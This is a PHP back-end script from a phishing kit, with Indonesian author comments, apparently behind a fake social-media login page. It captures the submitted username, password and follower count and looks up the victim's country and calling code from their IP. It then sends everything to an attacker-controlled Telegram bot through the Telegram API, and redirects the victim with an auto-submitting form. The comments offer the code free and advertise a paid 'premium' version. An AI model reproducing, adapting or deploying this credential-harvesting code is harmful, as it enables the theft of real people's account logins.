<?php
include 'bot.php';

// RECODE BOLEH ASAL JANGAN DI JUAL BELIKAN KONTOL
// INI VERSI ABAL2 KLO BUTUH VERSI PREMIUM BUY KAWAN :(
$ip = $_SERVER['REMOTE_ADDR'];


    function getUserIP()
    {
        if (isset($_SERVER["HTTP_CF_CONNECTING_IP"])) {
                  $_SERVER['REMOTE_ADDR'] = $_SERVER["HTTP_CF_CONNECTING_IP"];
                  $_SERVER['HTTP_CLIENT_IP'] = $_SERVER["HTTP_CF_CONNECTING_IP"];
        }
        $client  = @$_SERVER['HTTP_CLIENT_IP'];
        $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
        $remote  = $_SERVER['REMOTE_ADDR'];
    
        if(filter_var($client, FILTER_VALIDATE_IP))
        {
            $ip = $client;
        }
        elseif(filter_var($forward, FILTER_VALIDATE_IP))
        {
            $ip = $forward;
        }
        else
        {
            $ip = $remote;
        }
    
        return $ip;
    }

$ip = getUserIP();
$ccode = file_get_contents("https://ipapi.co/".$ip."/country_calling_code");
$country = file_get_contents("https://ipapi.co/".$ip."/country_name");
$username = $_POST['username'];
$password = $_POST['password'];
$followers = $_POST['followers'];
$time = date("Y-m-d H:i:s");

if($username == "" && $password == "" && $followers == "")
{
header("Location: index.html");
}else{

$text = urlencode("
🅂🄴🅃🄾🅁 🅁🄴🅂🅄🄻🅃 🄱🄾🅂
====================
ᵁˢᴱᴿᴺᴬᴹᴱ : $username
ᴾᴬˢˢᵂᴼᴿᴰ : $password
ᶠᴼᴸᴸᴼᵂᴱᴿˢ : $followers
ᶜᴼᴰᴱ : $ccode
ᶜᴼᵁᴺᵀᴿʸ : $country
ᴰᴬᵀᴱ : $time
====================
 ˹ 𝙳𝙴𝚅 𝙱𝚈 @bntg_fbrynsh ˼
");

// CAPE² CODING GW BAGIIN GRATIS EHH MALAH DI JUAL BELIKAN ANJING

$url = "https://api.telegram.org/bot".$API_KEY."/sendMessage?chat_id=$admin&text=$text&parse_mode=markdown";
file_get_contents($url);
if($url) {
echo "<form id='schtdek' method='POST' action='success.php'>
<input type='hidden' name='username' value=''>
</form>
<script type='text/javascript'>document.getElementById('schtdek').submit();</script>";
}
}
?>
